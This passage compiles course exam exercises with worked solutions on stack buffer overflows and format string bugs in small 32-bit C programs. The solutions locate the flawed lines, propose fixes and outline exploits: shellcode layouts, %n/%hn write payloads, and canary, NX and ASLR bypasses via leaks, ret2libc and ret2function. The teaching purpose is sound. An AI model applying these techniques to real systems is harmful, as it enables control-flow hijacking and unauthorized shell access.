\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Code snippet provided for a C program with structures and vulnerable functions `read_file`, `guess_token`, and `main`.
Assume that:
- Environment variables are located in the highest addresses.
- The program is compiled for the x86 architecture (32 bit) and for an environment that adopts the usual cdecl calling convention. Furthermore, assume that no compiler-level or OS-level mitigations against the exploitation of memory corruption errors are present (unless specified otherwise).
- `char *strcat(char *restrict s1, const char *restrict s2)` appends a copy of the null-terminated string s2 to the end of the null-terminated string s1, then adds a terminating '\0'.

[1 point] 1. The program is affected by typical buffer overflow and format string vulnerabilities. Complete the following table, focusing on a vulnerability per row.

[2 points] 2. Focus only on the stack-based buffer overflow(s) you found. Write an exploit for this vulnerability that must execute the following shellcode, composed of 8 bytes, which opens a shell: 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80.
2.a) Describe all the steps and assumptions required to successfully exploit the vulnerability. Include also any assumption on how you must call and run the program.
2.b) Make sure that you show how the exploit will appear in the process memory with respect to the stack layout right before and after the execution of the vulnerable line during the program exploitation showing: Direction of growth and high-low addresses; The name of each allocated variable; The content of relevant registers (i.e., EBP, ESP); The functions stack frames. Show also the content of the caller frame.

[3 points] 3. Focus only on the format-string vulnerability you found. Consider ONLY the correctly implemented "NX" mitigation technique. Someone told us that you can use this vulnerability to obtain a shell, even with the NX mitigation enabled. Rumors say there might be three working exploits that do not require neither ret2libc nor ROP. If the rumors are true, explain the exploits, otherwise explain why the vulnerability cannot be exploited. Describe all the steps and assumptions required to successfully execute the exploits.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### Question 1: Identifying Vulnerabilities

1.  **Buffer Overflow:**
    -   **Line:** `38` (`strcat(data.token, data.username);`)
    -   **Motivation:** The `token` buffer in the `UserData` struct is 16 bytes long. At line 37, it copies `secret` (up to 7 chars + null byte). At line 38, it concatenates `username` (which can be up to 31 chars + null byte, read at line 35). Thus, the total length copied into `token` can be 7 + 31 = 38 characters, which vastly exceeds its 16-byte capacity, overflowing into adjacent memory.
    -   **Modification:** Replace `strcat` with safe bounds checking operations, such as checking length beforehand.

2.  **Format String Vulnerability:**
    -   **Line:** `17` (`printf(data->username);`)
    -   **Motivation:** The `printf` function takes the `username` directly as the format string argument. If a user inputs format specifiers like `%x`, `%s`, or `%n` as their username, `printf` will interpret them, allowing an attacker to read from or write to the stack.
    -   **Modification:** Replace with `printf("%s", data->username);`.

### Question 2: Exploiting the Buffer Overflow

**2.a) Steps and Assumptions for Exploitation:**

1.  **Understanding the Target:** We want to overwrite the saved instruction pointer (sEIP) of the `main` function.
2.  **Payload Construction:** We need to inject our 8-byte shellcode. Since we control `username`, we can put our shellcode there. However, the overflow happens via `token`. The exploit copies `username` into `token` and beyond. Let's craft the `username` input: `[NOP Sled] + [Shellcode] + [Return Address]`. When `strcat` executes, it appends this `username` string to the end of the `secret` already present in `token`. The layout in memory after `strcat` will be: `token[0..x] (secret)` followed by `username_content` which overwrites sEBP and sEIP. We need the `Return Address` to point back into our shellcode, which is now located in the overflowed area.
3.  **Assumptions:** No ASLR (Address Space Layout Randomization) so stack addresses are predictable. No NX (Non-Executable stack) so we can execute code on the stack. No Stack Canaries.

**2.b) Stack Layout:**

**Direction:** High Addresses (Top) to Low Addresses (Bottom)

| Stack Content | Status (Before `strcat`) | Status (After `strcat`) |
| :--- | :--- | :--- |
| `sEIP` (Return Addr) | Original Return Addr | **Address of NOP sled** (Overwritten) |
| `sEBP` | Original EBP | Overwritten by NOPs/Shellcode |
| `data.token[0-15]` | `secret` + `\0` | `secret` + `NOPs`... |
| `data.msg` | Address of `msg1` | Untouched (located at lower address than token) |
| `data.msg1[0-15]` | "Token generated" | Untouched |
| `data.secret[0-7]` | `secret` content | Untouched |
| `data.username[0-31]`| `NOPs + Shellcode + Addr` | Untouched |

### Question 3: Exploiting Format String with NX Enabled

NX (No-eXecute) prevents execution of code on the stack. Therefore, we cannot jump to our shellcode. However, we can still use the format string vulnerability to write data to arbitrary memory locations using the `%n` format specifier. The goal is to bypass the token check to execute `system("/bin/sh");` located at line 25.

**Exploit 1: Overwrite a function's Return Address**
-   **Step:** Use the format string vulnerability at `printf(data->username)` to overwrite the return address of `read_file`.
-   **Target Value:** We overwrite it with the address of the code inside `guess_token` that prepares the arguments and calls `system("/bin/sh")` (i.e., the address of line 25 in the `.text` segment).
-   **Why it works:** Since we are jumping to existing executable code in the `.text` segment, NX does not block it.

**Exploit 2: Overwrite the `secret` value**
-   **Step:** The program compares user input (`guess`) against `data->token`. We can use the format string vulnerability (`%n`) to overwrite the contents of the `secret` variable in memory with a known string.
-   **Target Execution:** Once we know exactly what `secret` is, we know exactly what `token` will become after `strcat`. When `guess_token` asks for input, we provide that exact matching string.
-   **Why it works:** We pass the `strcmp` check legitimately.

**Exploit 3: Overwrite the `data->msg` pointer to leak the secret**
-   **Step:** We can use the format string vulnerability to overwrite the `data->msg` pointer so that it points to the memory address of `data->secret`.
-   **Target Execution:** When line 40 executes, it will print the secret to our console. Now we know the secret! We can calculate what the `token` will be and provide the correct guess to `guess_token`.
-   **Why it works:** We acquire the necessary knowledge to pass the logic check legitimately.

*Assumption for all:* ASLR must be disabled so we can hardcode the addresses.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Vulnerable C code handling a UserProfile struct and processing data... The program is affected by typical buffer overflow and format string vulnerabilities. Complete the following table...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Vulnerabilities**
1. **Buffer Overflow**: Occurs at lines 17 and 18 (`strcpy(profile.username, name); strcpy(profile.feedback, comment);`). The `strcpy` function does not check the bounds of the destination buffers (`profile.username` and `profile.feedback` are 32 bytes each), meaning input longer than 31 characters will overflow into adjacent memory, potentially overwriting `isAdmin` or saved registers. **Fix**: Use `strncpy` instead and explicitly null-terminate the buffer.
2. **Format String Vulnerability**: Occurs at line 23 (`printf(feedbackMessage);`). The user input from `profile.feedback` is concatenated into `feedbackMessage` and passed directly as the first argument to `printf`. If a user inputs format specifiers (like `%x`, `%n`), they can read or write to arbitrary memory locations. **Fix**: Change it to `printf("%s", feedbackMessage);`.

**Step 2: Exploitation Analysis with Stack Canary**
- If a stack canary is enabled, exploiting the buffer overflow to execute shellcode by overwriting the return address will fail, because the canary sits between local variables and the return address. Overwriting the buffer will corrupt the canary, leading the program to detect the smash and abort before returning.
- The **Format String Vulnerability**, however, does not need to overwrite memory linearly. Using the `%n` format specifier, an attacker can perform arbitrary memory writes and directly overwrite the Saved Instruction Pointer (sEIP) without touching the stack canary. 

**Step 3: Exploitation Steps**
1. Place the 8-byte shellcode into one of the buffers (e.g., within `name` or `comment`).
2. Craft a format string payload (e.g., using `%x` to pad and `%n` to write) and insert it into the `comment` variable, which gets copied to `feedbackMessage`.
3. Ensure the format string writes the memory address of the shellcode buffer exactly into the stack location where the sEIP (saved return address) for `processData()` is stored.
4. When computing padding for `%n`, account for the "Feedback:" string that is already prefixed in `feedbackMessage`.

**Step 4: Alternative Exploitation**
If shellcode execution is difficult, an attacker can simply use the format string vulnerability to elevate privileges within the program's logic. By using `%n`, the attacker can directly overwrite the memory address of the `profile.isAdmin` flag, changing its value from 0 to 1. This bypasses the need to hijack execution flow and simply exploits the program's existing `if(profile.isAdmin)` check to spawn a root shell (`system("/bin/sh")`).
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Vulnerable C program handling a user_t struct... Focus only on the stack-based buffer overflow(s) you found... Describe all the steps and assumptions...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Vulnerabilities**
1. **Buffer Overflow**: Occurs at line 16 (`strcat(message, user->username);`). The `message` buffer is 52 bytes. Line 15 writes 8 bytes ("Ciao to "). Line 27 allows reading 40 bytes into `user->username`. If `username` doesn't have a null terminator (because `read` doesn't add one), `strcat` will keep reading into the contiguous memory space (which is `user->password`) until it hits a null byte, overflowing the `message` buffer entirely.
2. **Format String**: Occurs at line 18 (`printf(message);`). If the attacker sneaks format specifiers like `%x` into `username`, they get evaluated when `message` is printed.

**Step 2: Exploiting the Buffer Overflow**
- **Goal**: Execute 8-byte shellcode.
- **Mechanism**: The struct `user_t` holds `username` [40] immediately followed by `password` [20]. The `read` at line 27 fills `username` with 40 bytes (no null byte). The `read` at line 30 fills `password` with 20 bytes.
- **Payload Construction**: 
  1. Fill `username` (40 bytes) with a NOP sled (`\x90\x90...`) and the 8-byte shellcode.
  2. Fill `password` (first 8 bytes) with junk (e.g., "AAAAAAAA"), followed by the memory address pointing back to the NOP sled in `message`.
- **Execution**: When `strcat` executes, it copies the 40 bytes of `username`, fails to find a null byte, and continues copying the contents of `password`. This massive string overflows the 52-byte `message` buffer, overwriting the saved Return Address (sEIP) with the attacker-controlled address.
- **Assumptions**: Address Space Layout Randomization (ASLR) and Non-Executable Stack (NX) must be disabled. The target return address must not contain null bytes (`\x00`), or `strcat` will terminate prematurely.

**Step 3: ASLR Mitigation Context**
- If ASLR is enabled, stack addresses change on every run. The hardcoded return address in the exploit will miss the shellcode.
- **Local Attacker Bypass**: A local attacker can inject the shellcode into a massive Environment Variable padded with an enormous NOP sled. Because environment variables are located at the highest addresses and are predictable, guessing an approximate address gives a high statistical probability of landing inside the massive NOP sled, effectively bypassing ASLR.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
C program with scramble() function... The program is affected by typical buffer overflow and format string vulnerabilities...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Vulnerabilities**
1. **Buffer Overflow**: Occurs at line 16 (`strncpy(&data.buf[sequence[i]*15], data.buf2, 15);`). The loop relies on the `sequence` array `{3, 1, 4, 0, 2}`. The destination buffer `data.buf` is exactly 64 bytes long. When `sequence[i]` is `4` (the third iteration), the code calculates the offset as `4 * 15 = 60`. It then copies 15 bytes starting from index 60. This writes data up to index 74, surpassing the 64-byte limit of the buffer, causing a localized heap/stack overflow depending on memory layout.
2. **Format String Vulnerability**: Occurs at line 17 (`printf(data.buf);`). The buffer containing user-supplied data (`data.buf2`) is copied into `data.buf` and then passed directly to `printf` without a format specifier (like `%s`). 

**Step 2: Exploiting the Buffer Overflow**
- **Goal**: Execute shellcode using the out-of-bounds write.
- **Mechanism**: Since `data_t` holds `buf2` and `buf` adjacently, overflowing `buf` overwrites the saved EBP and eventually the saved Return Address (sEIP) on the stack.
- **Payload Strategy**: The attacker stores the 8-byte shellcode in an environment variable to bypass strict length limits. During the iteration where `sequence[i] == 4`, the attacker inputs a precisely crafted 15-byte string: `AAAABBBB<addr_shellcode>`. The `AAAA` fills the end of the buffer, `BBBB` overwrites the saved Base Pointer (EBP), and the final 4 bytes overwrite the saved Instruction Pointer (sEIP) with the memory address of the environment variable holding the shellcode.

**Step 3: Exploiting the Format String Vulnerability**
- **Goal**: Use `%n` to overwrite a specific memory location.
- **Mechanism**: The attacker calculates the exact integer values needed to write the target address byte-by-byte using `%hn` (half-word writes). 
- **Payload Construction**: The payload looks like `\xe6\xfe...%(54260-8)c%7$hn%(58964-54260)c%8$hn`. Because the `scanf` restricts input to 15 characters, this long payload must be split across the multiple iterations of the `scramble` loop. The first half is injected during one iteration, and the second half during the next, carefully aligning the stack pointers so `printf` evaluates the concatenated format string correctly to overwrite the target.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Vulnerable C program with upload_file()... Buffer overflow and format string... Describe all steps to exploit...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Vulnerabilities**
1. **Buffer Overflow**: Occurs at lines 35 (`gets(data.filename)`) and 43 (`gets(data.filecontent)`). The `gets()` function is inherently unsafe as it does not check buffer limits. Since `filecontent` is only 36 bytes, entering a longer string will overwrite adjacent memory on the stack.
2. **Format String**: Occurs at lines 38 and 48 (`printf(data.error_message)`). If an attacker manages to write format specifiers (`%x`, `%n`) into the `error_message` buffer, they can achieve arbitrary read/write.

**Step 2: Exploiting the Buffer Overflow**
- **Goal**: Execute 8-byte shellcode by hijacking execution flow.
- **Payload Injection**: 
  1. The program asks for a filename. We input a valid name (not "secret.txt") to bypass the `exit(-1)` check.
  2. The program asks for file content via `gets()`. We input a massive string crafted as: `[NOP Sled] + [8-byte Shellcode] + [Padding] + [Target Memory Address]`.
- **Execution**: The `gets()` function reads our massive string and writes past the 36-byte boundary of `data.filecontent`. It overflows the struct, overwrites the saved EBP, and crucially, overwrites the saved Instruction Pointer (sEIP). 
- **Assumptions**: We assume Stack Canaries, ASLR, and NX (Non-Executable Stack) are disabled. The Target Memory Address must point precisely back to our NOP sled on the stack.

**Step 3: Defeating Stack Canaries via Format String**
- If a **Stack Canary** is enabled, the buffer overflow will overwrite it, causing the program to crash securely before returning. 
- **Bypass**: We shift to using the Format String vulnerability. By placing the shellcode in memory and using `%n` format specifiers inside `error_message`, we can directly write the address of our shellcode into the memory location holding the sEIP. This surgical, non-linear write completely jumps over the Stack Canary, leaving it intact while still hijacking execution.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities (6 points)}
\subsubsection*{Problem}
\begin{verbatim}
1. #include <stdio.h>
2. #include <string.h>
3. #include <unistd.h>
4. #include <stdlib.h>
5.
6. typedef struct{
7. char name[4];
8. char description[36];
9. int hack_index;
10. } hackémon;
11.
12. void add_hackémon(){
13. hackémon h;
14.
15. // TODO: allow the user to enter multiple hackémons
16. h.hack_index = 1;
17.
18. while (h.hack_index > 0){
19. // TODO: allow the user to enter a custom description
20. strcpy(h.description, "hakachu is the best hackémon");
21.
22. puts("Enter the hackémon name:");
23. scanf("%112s", h.name);
24.
25. puts("New hackémon added!");
26. printf(h.description);
27.
28. // TODO: add the hackémon to the hackedex
29. h.hack_index--;
30. }
31. }
32.
33. int main(){
34. clearenv();
35. add_hackémon();
36. return 0;
37. }

[1 point] 1. The program is affected by typical buffer overflow and format string vulnerabilities. Complete the following table, focusing on a vulnerability per row.
[2 points] 2. Focus only on the stack-based buffer overflow(s) you found. Write an exploit for this vulnerability that must execute a very sophisticated shellcode composed of 60 bytes.
2.a) Describe all the steps and assumptions required to successfully exploit the vulnerability. Include also any assumption on how you must call and run the program...
2.b) Make sure that you show how the exploit will appear in the process memory with respect to the stack layout right before and after the execution of the vulnerable line...
[2 points] 3. To solve the problem, the senior developer, Pario Molino, decides to compile the program with a correctly implemented “Stack Canary” mitigation technique (i.e, randomly generated and non-guessable). Is it effective to prevent your exploit?
[1 point] 4. Driven by desperation, the senior developer, Pario Molino, decides to compile the program with both the “Stack Canary” and “NX” mitigation techniques. Is it possible to get a shell using one of the techniques you know? How?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying the Vulnerabilities.**
Looking at the `hackémon` struct, we see `name` is a 4-byte buffer.
On line 23, `scanf("%112s", h.name);` reads up to 112 bytes into `name`. This clearly overflows the 4-byte buffer, corrupting adjacent stack memory (`description`, `hack_index`, saved EBP, and saved EIP). This is a **Buffer Overflow**. To fix it, change the format specifier to bound the input: `scanf("%3s", h.name);` (leaving 1 byte for the null terminator).
On line 26, `printf(h.description);` prints the `description` string without a format specifier (like `"%s"`). If a user can control `h.description`, they can inject format string specifiers (like `%x`, `%n`). This is a **Format String Vulnerability**. To fix it, use `printf("%s", h.description);`.

**Step 2: Exploiting the Buffer Overflow.**
Our goal is to execute a 60-byte shellcode.
The stack layout grows from high to low addresses. Local variables are placed on the stack.
Layout (from lowest to highest address): `h.name` (4 bytes) -> `h.description` (36 bytes) -> `h.hack_index` (4 bytes) -> `saved EBP` (4 bytes) -> `saved EIP` (4 bytes) -> `Caller's frame`.
Notice that `h.name` is at the lowest address. When `scanf` writes to `h.name`, it writes towards higher addresses, naturally overflowing into `description`, then `hack_index`, `sEBP`, and finally `sEIP`.
To redirect execution, we must overwrite the `sEIP` with the address of our shellcode.
However, we have a problem: the `while` loop continues as long as `h.hack_index > 0`. Because `h.name` is before `h.hack_index` in memory, our overflow will necessarily overwrite `h.hack_index` before it reaches `sEIP`. If we overwrite it with a positive value, the loop will continue, and the function will not return (thus not popping `sEIP` into `EIP`). If we overwrite it with $0$ or a negative value, the loop terminates!
Moreover, our shellcode is 60 bytes long. The space between `h.name` and `sEIP` is $4 + 36 + 4 + 4 = 48$ bytes. We cannot fit the 60-byte shellcode *before* `sEIP`. We must place it *after* `sEIP` (in the caller's stack frame).
**Exploit Construction:**
1. Send 40 bytes of padding (to fill `name` and `description`).
2. The next 4 bytes will overwrite `h.hack_index`. We set these to `0xFFFFFFFF` (a negative integer in two's complement) so the loop exits immediately.
3. Send 4 bytes to overwrite `sEBP` (can be garbage).
4. Send 4 bytes to overwrite `sEIP`. This must be the memory address pointing exactly to the byte right after this `sEIP` on the stack.
5. Send the 60-byte shellcode.
When `add_hackémon` returns, it pops our injected address into `EIP`, and execution flows directly into our shellcode.

**Step 3: Bypassing the Stack Canary.**
A Stack Canary places a random, unpredictable value between the local variables and the `sEBP`/`sEIP`. Before the function returns, it checks if the canary was modified. Our previous linear overflow would blindly overwrite the canary, failing the check and terminating the program before our shellcode runs.
So, the canary *is* effective against the simple linear BOF.
However, we also have a Format String Vulnerability! We can use it in combination with the BOF to bypass the canary.
If we overflow `h.name`, we can overwrite `h.description` *during the scanf call*! `scanf` happens *after* `strcpy`. So our overflow from `h.name` goes into `h.description`.
Thus, we *can* inject a format string that will be executed by `printf` on line 26!
To bypass the canary:
1. First iteration: Overflow `h.name` to place a format string payload into `h.description` that *reads* (leaks) the canary value off the stack using `%x` or `%p`. Overwrite `h.hack_index` with a large number to stay in the loop. Be careful not to overflow all the way to the canary yet.
2. Read the leaked canary from the program output.
3. Second iteration: Now construct the full BOF payload. We overwrite `h.name`, `h.description`, `h.hack_index` (with a negative value to exit), write the *correct leaked canary* back into its place, overwrite `sEBP`, overwrite `sEIP` with the shellcode address, and append the shellcode. The canary check will pass!

**Step 4: Bypassing Canary + NX.**
NX (No-eXecute) means the stack is not executable. Our shellcode placed on the stack will crash when the CPU tries to run it.
To bypass NX, we cannot execute our injected code. Instead, we must reuse existing executable code in the program's memory or linked libraries (like `libc`). This is called **Return-Oriented Programming (ROP)** or **ret2libc**.
We use the exact same leak-and-overwrite technique as above to bypass the canary. However, instead of overwriting `sEIP` with a pointer to our shellcode, we overwrite `sEIP` with the address of the `system()` function in libc. We then place a fake return address (often `exit()`) and a pointer to the string `"/bin/sh"` (which we can also find in libc or place on the stack ourselves). When the function returns, it "returns" into `system("/bin/sh")`, spawning a shell without executing any stack memory.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
The program is compiled for the x86 architecture (32 bit) and for an environment that adopts the usual cdecl calling convention. Furthermore, assume that no compiler-level or OS-level mitigations against the exploitation of memory corruption errors are present (unless specified otherwise).

1. [1 point] Fill out the following table by answering the questions for each class of vulnerabilities. (Buffer Overflow, Format String).
2. [2 points] Write an exploit that must execute the following shellcode, composed of 8 bytes, which opens a shell: 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90.
2.a) Describe all the steps and assumptions required to successfully exploit the vulnerability. Include also any assumption on how you must call and run the program.
2.b) Make sure that you show how the exploit will appear in the process memory with respect to the stack layout right before and after the execution of the vulnerable line during the program exploitation showing: Direction of growth and high-low addresses; The name of each allocated variable; The content of relevant registers (i.e., EBP, ESP); The functions stack frames. Show also the content of the caller frame.
3. [1 points] Consider ONLY the correctly implemented “Stack Canary” mitigation technique (i.e, randomly generated and non-guessable). Is it effective to prevent your exploit at point 2? Motivate your answer.
4. [2 points] Consider ONLY the correctly implemented “NX” mitigation technique. A friend of yours managed to interact with the program to read the content of the file “./flag” without executing any shellcode, or recurring to ret2libc. The interaction was remote, she did not have access to the local machine. If this is possible, please explain all the steps and assumptions required for a successful exploitation.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step-by-Step Pedagogical Solution:**

**Question 1: Vulnerability Identification**
- **Buffer Overflow**: Not present. The `scanf` format specifiers strictly limit input lengths (`%39s` for a 40-byte buffer and `%59s` for a 60-byte buffer), preventing overflows.
- **Format String**: Present at line 36 (`printf(p.address);`). The `address` string is controlled by the user and passed directly as the format string argument. 
  *Fix*: Modify to `printf("%s", p.address);`.

**Question 2: Exploit Steps and Stack Layout**
*2.a Exploit Steps and Assumptions:*
- **Goal**: Hijack control flow to execute the 8-byte shellcode.
- **Steps**:
  1. Inject the shellcode into the `p.name` variable when prompted.
  2. Trigger the vulnerability by ensuring the `p.address` input is exactly 59 characters long to bypass the length check at line 34.
  3. Craft the 59-byte payload in `p.address` to exploit the format string vulnerability. The payload uses `%x` to navigate the stack to the payload itself, width specifiers to pad the printed character count to match the memory address of the shellcode (`&p.name`), and `%n` to write this address into the stack location holding the saved return instruction pointer (Saved EIP).
- **Assumptions**: ASLR (Address Space Layout Randomization) and NX (No-eXecute) are disabled. The payload contains no whitespace characters.

*2.b Stack Layout Visualization:*
- **Direction**: Memory addresses grow Low to High. The stack grows High to Low.
- **Caller Frame (`main`)**: High addresses. Contains local variables (`choice`), Saved EBP of caller, and Return Address.
- **Current Frame (`amazing`)**: 
  - `sEIP` (Saved Return Address to `main`) - **Target of Overwrite**
  - `sEBP` (Saved Base Pointer)
  - `p.age` (4 bytes)
  - `p.address` (60 bytes) - Contains format string payload.
  - `p.name` (40 bytes) - Contains shellcode.
- **Registers**: `ESP` points to the top of the stack (lowest address). `EBP` points to `sEBP`.
- **After line 36 execution**: The format string write alters `sEIP` to point to the address of `p.name`. When `amazing` returns, execution jumps to the shellcode.

**Question 3: Stack Canary Mitigation**
*Effectiveness*: The Stack Canary is **not effective** against this exploit. Canaries protect against linear buffer overflows that overwrite contiguous memory space. The format string exploit uses `%n` to perform direct, arbitrary memory writes via pointer dereferencing, allowing it to surgically overwrite the `sEIP` while leaving the canary completely untouched.

**Question 4: Exploiting with NX Enabled**
*Mechanism*: The NX bit prevents execution of code on the stack (rendering the shellcode useless). However, the program contains a function `ascii_art(char *filename)` that reads and prints a file.
*Exploit Steps (ret2function)*:
1. Use the same format string vulnerability at line 36.
2. Instead of pointing `sEIP` to the shellcode, overwrite `sEIP` with the memory address of the `ascii_art` function (which resides in the executable `.text` segment).
3. In 32-bit cdecl, function arguments are passed on the stack. The exploit must perform multiple arbitrary writes to set up the stack frame for `ascii_art`:
   - Write `&ascii_art` into the `sEIP` location.
   - Write the address of the string `"./flag"` (which can be provided in `p.name`) into the location `sEIP + 8` (the first argument position).
4. When `amazing()` returns, it jumps to `ascii_art`, reads the argument from the stack, and prints the flag.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Consider the provided C program containing a struct `pippo` with members `ch`, `index`, `*f`, and `file_content[64]`. The program reads characters from a file into `file_content` until a newline is encountered, using `p.index` to keep track. After reading, it checks if the first 4 characters are "flag" and prints `file_content` using `printf`.
The program is compiled for x86 (32 bit), cdecl calling convention, with no mitigations.

[1 point] 1. The program is affected by typical buffer overflow and format string vulnerabilities. Complete the following table, focusing on a vulnerability per row.
[2 points] 2. Focus only on the stack-based buffer overflow(s) you found. Write an exploit for this vulnerability that must execute the following shellcode: \x20\x30\x40\x50\x60\x70\x80\xff.
[2 points] 3. To solve the problem, the senior developer decides to compile the program with a correctly implemented “Stack Canary” mitigation technique. Is it effective to prevent your exploit?
[1 point] 4. Driven by desperation, the developer compiles with only the “NX” mitigation techniques. Is it possible to get a shell using one of the techniques you know? How? Provide all the necessary details.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### 1. Vulnerability Analysis
**Step-by-Step Reasoning:**
- **Buffer Overflow (Lines 25-30):** Inside the `while` loop, characters are read using `fgetc` and stored into `p.file_content[p.index]`. The loop increments `p.index` infinitely as long as there is no newline (`\n`) or `EOF`. The array `file_content` only holds 64 bytes. If the file contains more than 64 characters without a newline, it will write past the bounds of `file_content`, corrupting adjacent memory on the stack (including the saved EBP and EIP).
  - *Fix:* Check bounds during the loop: `if (p.index >= 63) break;`.
- **Format String Vulnerability (Line 37):** `printf(p.file_content);` passes user-controlled string directly as the format string parameter. If the file contains format specifiers like `%x` or `%n`, `printf` will read/write memory it shouldn't.
  - *Fix:* Use a static format string: `printf("%s", p.file_content);`.

### 2. Exploit for the Buffer Overflow
**Step-by-Step Reasoning:**
Because there are no mitigations (like Stack Canaries or NX/ASLR), the stack is executable, and addresses are predictable.
1. **Stack Layout:** The struct `pippo` is allocated on the stack. In memory (from low to high addresses), struct fields are usually placed sequentially: `ch` -> `index` -> `f` -> `file_content[64]`. However, since `p` is allocated on the stack which grows downwards, overflowing `file_content` upwards towards higher addresses will directly overwrite the caller's saved Base Pointer (sEBP) and saved Instruction Pointer (sEIP) belonging to the `open_whatever` stack frame.
2. **Execution Flow:** 
   - We must provide input when the program asks via `write_whatever`.
   - The payload will be written into a file, which is then read back by `open_whatever`.
3. **Payload Structure:**
   - Starts with `"flag"` (to pass the `strncmp` check on line 36).
   - Followed by a NOP sled (e.g., `\x90` bytes) to provide a landing pad for execution.
   - Followed by the provided shellcode: `\x20\x30\x40\x50\x60\x70\x80\xff`.
   - Padding to reach the exact offset of `sEIP` (e.g., filling the 64 bytes of `file_content` + padding for sEBP).
   - Overwriting `sEIP` with the memory address pointing back to the NOP sled inside `file_content`.
   - **Crucial Constraint:** The payload **must not** contain any newline (`\n` or `\x0a`) characters, as that would prematurely terminate the `fgetc` reading loop on line 25.

### 3. Impact of Stack Canaries
**Step-by-Step Reasoning:**
A Stack Canary places a random, non-guessable value between local variables and the saved control data (sEBP, sEIP). Before the function returns, it checks if the canary has been altered.
- **Effectiveness against BOF:** Yes, it is highly effective against the Buffer Overflow. To overwrite `sEIP`, our linear buffer overflow must overwrite the canary. When the function attempts to return, it will detect the altered canary and terminate the program, preventing shellcode execution.
- **Alternative Exploitation:** The **Format String Vulnerability** at line 37 is still present! We can craft a payload starting with `"flag"`, avoiding newlines, containing `%n` format specifiers. By exploiting the format string, we can perform an arbitrary memory write to overwrite the Global Offset Table (GOT) entry for a subsequent function (like `exit` or `printf` itself) to point to our shellcode, bypassing the stack canary entirely because we are writing directly to memory without overflowing the stack linearly.

### 4. Impact of NX (No-Execute)
**Step-by-Step Reasoning:**
NX (Data Execution Prevention) marks the stack as non-executable. Even if we hijack `sEIP` and jump to our shellcode, the CPU will raise a fault and crash instead of executing it.
- **Bypassing NX:** We cannot execute shellcode on the stack, but we can reuse existing executable code in memory. 
- **Technique: Return-to-libc (ret2libc) or ROP:** We use the buffer overflow to overwrite `sEIP` not with a stack address, but with the address of a function already in the `.text` section or an external library. Since the prompt states we know `.text` addresses but not `libc`, we can perform a Return-Oriented Programming (ROP) attack using gadgets from `.text`, or simply jump to the `open_whatever` or `main` functions with specific arguments to alter program flow in our favor (if an advantageous path exists). If a leak is possible (e.g., using the format string to leak a libc pointer), a standard ret2libc to `system("/bin/sh")` is achievable.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a C program simulating 'Dunder Mifflin'. Identify a Buffer Overflow and Format String vulnerability. Write an exploit to execute shellcode and discuss the effectiveness of NX and ASLR mitigations.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Vulnerability Identification:
- Buffer Overflow: Line 22 `while (company.count <= 400 ...)`. The `company.buffer` is exactly 400 bytes. The loop condition allows writing up to 401 bytes (indices 0 to 400), leading to a one-byte overflow into the adjacent `isMichael` boolean.
- Format String: Line 29 `printf(company.buffer);`. The buffer is passed directly to printf without a format specifier like "%s", allowing an attacker to inject format string modifiers (e.g., %x, %n).

2. Exploit Construction:
- We use the format string vulnerability to hijack the execution flow. The shellcode is placed in `company.buffer`. We use format string tokens to overwrite a return address or GOT entry to point to the shellcode.
- Constraint: The payload must end with '!' to exit the while loop, and must NOT contain '!' in the middle. A '\n' is needed to trigger the specific switch case executing the vulnerable printf.
- Memory Layout: `buffer` is at lower addresses, `isMichael` follows it. The EBP and saved EIP are at higher addresses on the stack.

3. NX (No-eXecute) Mitigation:
- Effectiveness: NX makes the stack non-executable, which prevents our injected shellcode from running. However, we can still exploit the program by leveraging the one-byte buffer overflow.
- Alternative Exploit: By overflowing `company.buffer` by one byte, we overwrite the `isMichael` boolean to a non-zero value. This causes `if (company.isMichael)` to evaluate to true, executing `system("/bin/sh")` directly without needing shellcode.

4. ASLR Mitigation:
- Effectiveness: ASLR randomizes stack addresses, breaking hardcoded shellcode addresses. However, because we can trigger the vulnerable `printf` multiple times (by not providing '!'), we can first leak a stack address using `%x` or `%p`, calculate the exact shellcode location, and then send the format string exploit to overwrite the saved EIP with the calculated address.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a C program with a state struct containing boolean flags and a banner buffer. Identify a Buffer Overflow and Format String vulnerability, and write a shellcode exploit.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Vulnerabilities:
- Buffer Overflow: Line 23 `scanf("%d", &s.guardsAsleep);`. The variable `guardsAsleep` is a `bool` (typically 1 byte), but `%d` expects a 4-byte integer. Providing a large integer (e.g., -1 or 0xFFFFFFFF) will overwrite the adjacent 3 bytes in memory (gateOpen, drawbridgeLowered, torchLit).
- Format String: Line 27 `printf(s.banner);`. The user-controlled banner string is passed directly to `printf`, enabling format string exploits.

2. Shellcode Exploit:
- Goal: Execute an 8-byte shellcode.
